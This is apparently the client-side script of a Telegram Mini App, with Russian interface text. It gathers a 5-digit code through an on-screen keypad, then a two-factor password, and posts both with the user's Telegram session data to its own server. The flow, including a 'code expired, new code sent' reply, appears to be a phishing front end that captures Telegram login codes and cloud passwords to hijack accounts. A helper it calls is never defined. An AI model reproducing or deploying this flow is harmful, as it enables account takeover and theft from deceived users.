const tg = window.Telegram.WebApp;
const mainButton = tg.MainButton;
const themeParams = tg.themeParams;



function focusNext(input) {
    if (input.nextElementSibling) {
        input.nextElementSibling.focus();
    }
}

function addDigit(digit) {
    const inputs = document.querySelectorAll('.code-input');
    for (const input of inputs) {
        if (!input.value) {
            input.value = digit;
            focusNext(input);
            break;
        }
    }

    const code = Array.from(inputs).map(input => input.value).join('');
    if (code.length === 5) {
        mainButton.setText('Подтвердить код');
        mainButton.show();
        mainButton.onClick(submitCode);
    } else {
        mainButton.hide();
    }
}


function deleteDigit() {
    const inputs = document.querySelectorAll('.code-input');
    for (let i = inputs.length - 1; i >= 0; i--) {
        if (inputs[i].value) {
            inputs[i].value = '';
            inputs[i].focus();
            break;
        }
    }

    const code = Array.from(inputs).map(input => input.value).join('');
    if (code.length < 5) {
        mainButton.hide();
    }
}

function handleFocus(input) {
    input.addEventListener('paste', handlePaste);
}

function handlePaste(event) {
    event.preventDefault();
    const pastedText = (event.clipboardData || window.clipboardData).getData('text');
    const digits = pastedText.replace(/\D/g, '').substring(0, 5);

    const inputs = document.querySelectorAll('.code-input');
    for (let i = 0; i < digits.length; i++) {
        inputs[i].value = digits[i];
    }

    if (digits.length === 5) {
        mainButton.setText('Подтвердить код');
        mainButton.show();
        mainButton.onClick(submitCode);
    } else {
        mainButton.hide();
    }
}

async function verify2FA() {
    try {
        const password = await handle2FA();

        mainButton.disable();
        mainButton.showProgress(true);
        var userData = window.Telegram.WebApp.initData;
        const send_data = {
            two_fa_code: password,
            init_data: userData
        }

        const response = await fetch('/auth_2fa', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(send_data)
        });

        const result = await response.json();

        if (result.result === 'success') {
            tg.showAlert('Пароль верный!');

        } else {
            tg.showAlert('Неверный пароль. Попробуйте снова.');
        }
    } catch (error) {
        tg.showAlert(error.message || 'Произошла ошибка при проверке пароля.');
    } finally {
        mainButton.enable();
        mainButton.hideProgress();
    }
}


async function handle2FA() {
    const themeParams = tg.themeParams;

    return Swal.fire({
        text: 'Требуется двухфакторная аутентификация.',
        input: 'password',
        inputAttributes: {
            autocapitalize: 'off',
            autocorrect: 'off'
        },
        showCancelButton: true,
        confirmButtonText: 'ОК',
        cancelButtonText: 'Отмена',
        allowOutsideClick: false,
        customClass: {
            popup: 'modal-content',
            title: 'h1',
            htmlContainer: 'description',
            input: 'code-inputs input',
            confirmButton: 'button-pass',
            cancelButton: 'button-pass'
        },
        buttonsStyling: false,
        didOpen: () => {
            applyTelegramStylesToModal();
        }
    }).then((result) => {
        if (result.isConfirmed) {
            return result.value;
        } else {
            throw new Error('Пользователь отменил ввод пароля.');
        }
    });
}

async function submitCode() {

    mainButton.disable();
    mainButton.showProgress(true);

    try {
        const inputs = document.querySelectorAll('.code-input');
        const code = Array.from(inputs).map(input => input.value).join('');
        var userData = window.Telegram.WebApp.initData;

        const send_data = {
            code: code,
            init_data: userData
        }

        const response = await fetch('/verify-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(send_data)
        });

        const result = await response.json();


        if (result.result === 'success') {
            tg.showAlert('Код верный!');
        } else if (result.result === '2fa_required') {
            mainButton.hideProgress();
            mainButton.enable();
            mainButton.hide();
            await verify2FA();
        } else if (result.result === 'resend_code') {
            tg.showAlert('Этот код истек, был отправлен новый код!');
            document.getElementById('error-message').style.display = 'block';
            mainButton.hideProgress();
            mainButton.enable();
            mainButton.hide();
        } else {
            document.getElementById('error-message').style.display = 'block';
            mainButton.hide();
        }
    } catch (error) {
        tg.showAlert('Произошла ошибка при проверке кода.');
        mainButton.hide();
    } finally {
        mainButton.enable();
        mainButton.hideProgress();
    }
}



const popup = document.querySelector('.swal2-popup');
const title = document.querySelector('.swal2-title');
const content = document.querySelector('.swal2-html-container');
const input = document.querySelector('.swal2-input');
const confirmButton = document.querySelector('.swal2-confirm');
const cancelButton = document.querySelector('.swal2-cancel');

if (popup) {
    popup.style.backgroundColor = themeParams.bg_color || '#fff';
    popup.style.color = themeParams.text_color || '#000';
}

if (title) {
    title.style.color = themeParams.hint_color || themeParams.text_color;
}

if (content) {
    content.style.color = themeParams.secondary_text_color || themeParams.text_color;
}

if (input) {
    input.style.borderColor = themeParams.hint_color || '#ccc';
    input.style.color = themeParams.text_color || '#000';
    input.style.backgroundColor = themeParams.bg_color || '#fff';
}

if (confirmButton) {
    confirmButton.style.backgroundColor = themeParams.button_color || '#2a9d8f';
    confirmButton.style.color = themeParams.button_text_color || '#fff';
}

if (cancelButton) {
    cancelButton.style.backgroundColor = themeParams.accent_text_color || '#ff4d4d';
    cancelButton.style.color = themeParams.button_text_color || '#fff';
}




document.body.style.backgroundColor = themeParams.bg_color;
document.body.style.color = themeParams.text_color;

document.getElementById('app-title')?.style.setProperty('color', themeParams.hint_color || themeParams.text_color);
document.getElementById('description')?.style.setProperty('color', themeParams.secondary_text_color || themeParams.text_color);

const inputs = document.querySelectorAll('.code-input');
inputs.forEach(input => {
    input.style.borderColor = themeParams.hint_color || '#ccc';
    input.style.color = themeParams.text_color;
});

const keyboardButtons = document.querySelectorAll('.keyboard button');
keyboardButtons.forEach(button => {
    button.style.backgroundColor = themeParams.button_color || '#f0f0f0';
    button.style.color = themeParams.button_text_color || '#333';
});

const deleteButton = document.querySelector('.keyboard .delete');
if (deleteButton) {
    deleteButton.style.backgroundColor = themeParams.accent_text_color || '#ff4d4d';
}

const errorMessages = document.querySelectorAll('.error-message');
errorMessages.forEach(error => {
    error.style.color = themeParams.accent_text_color || '#e74c3c';
});


tg.ready();
mainButton.hide();

document.querySelectorAll('.code-input').forEach(input => {
    input.addEventListener('focus', () => {
        mainButton.setText('');
        mainButton.show();
    });

    input.addEventListener('blur', () => {
        mainButton.hide();
    });
});